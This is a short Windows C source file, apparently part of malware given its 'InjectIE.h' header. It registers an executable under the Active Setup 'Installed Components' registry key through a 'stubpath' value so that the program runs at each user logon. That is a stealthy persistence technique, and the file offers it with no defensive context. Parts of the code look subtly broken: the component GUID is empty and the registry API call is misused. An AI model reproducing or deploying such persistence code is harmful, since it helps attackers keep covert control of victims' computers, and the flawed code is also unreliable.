#include "InjectIE.h"

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd)
{
	HKEY hKey;
	TCHAR svExeFile[256] = "%SystemRoot%\\system32\\test.exe";
	RegCreateKey(HKEY_LOCAL_MACHINE, 
		"SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{}",
		&hKey);
	RegSetValue(hKey, "stubpath", REG_EXPAND_SZ, (BYTE*)svExeFile, sizeof(svExeFile));
	RegCloseKey(hKey);
	return 0;
}

